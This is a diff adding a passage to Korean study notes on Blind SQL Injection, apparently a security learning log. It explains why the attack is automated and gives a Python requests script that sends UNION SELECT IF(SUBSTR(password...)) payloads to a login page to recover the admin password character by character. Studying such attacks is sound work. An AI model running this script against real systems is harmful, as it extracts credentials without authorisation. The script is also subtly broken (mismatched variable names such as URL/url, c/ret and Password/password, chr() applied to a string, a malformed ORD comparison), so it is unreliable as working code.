@@ -259,6 +259,43 @@
 <br/>
 
 * Blind SQL Injection 공격 자동화
+    - 한 바이트씩 비교하여 공격하는 방식이므로 다른 공격에 비해 많은 시간을 들여야 하며 이용자가 직접 입력하기엔 물리적으로 한계가 발생할 수 있음 <br/> &nbsp;&nbsp; **→ 📌 공격을 자동화하는 스크립트를 작성하여 Blind SQL Injection 공격을 수행함**
+        + 대중적으로 많이 사용되는 Python이나 웹 브라우저에 기본적으로 내장되어 있는 Javascript를 이용하는 등 다양한 언어와 라이브러리를 활용하여 효율적인 공격 스크립트를 작성할 수 있음
+    - 파이썬의 ```requests``` 모듈을 이용한 스크립트 작성 방법
+        + ⚠️ 공격 자동화 스크립트를 작성하기 전에 **이용자가 입력할 수 있는 모든 문자의 범위**를 지정해야 함
+            - 비밀번호의 경우 일반적으로 알파벳 대소문자, 숫자, 그리고 특수문자로 이루어짐 → 아스키 범위 중에서 32부터 126까지를 지정하여 공격 스크립트를 작성함
+        + Python을 이용한 공격 자동화 스크립트 예시
+            ```python
+            #!/usr/bin/python3
+
+            import requests
+            import string
+
+            url = 'http://example.com/login' # 공격 URL
+            password = '' # password를 저장할 변수
+            
+            # 비밀번호가 포함될 수 있는 문자를 string 모듈로 사용해 생성함
+            tc = string.ascii_letters + string.digits + string.punctuation
+            # tc → abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!"#$%&\'()*+,-./:;<=>?@[\\]^_`{|}~
+
+            # ⚠️ 길이를 먼저 구하고 길이만큼 반복문을 돌릴 수도 있음
+            for index in range(1, 100):
+                for ch in tc: # tc 대신에 range(32, 127)을 사용해도 무관함
+                    payload= "/?username=' UNION SELECT IF(SUBSTR(password, %s, 1)=ORD(%s), 'admin', 'not admin') FROM users WHERE username='admin'--" %(index, ch)
+                    addr = URL + payload
+
+                    ret = requests.get(addr)
+                    if c.text.find("True") != -1: # 데이터베이스에서 "admin"을 반환하면 출력되는 "True" 문자열을 찾음
+                        password += chr(ch) # 해당 결과를 반환하는 문자를 password 변수에 추가함
+                        break
+            
+            # admin의 전체 비밀번호를 출력함
+            print(f"Password is {Password}")
+            ```
+
+<br/>
+
+* Blind SQL Injection을 통해 데이터베이스의 내용을 효율적으로 알아내기 위한 방법
 
 <br/><br/><br/>
 
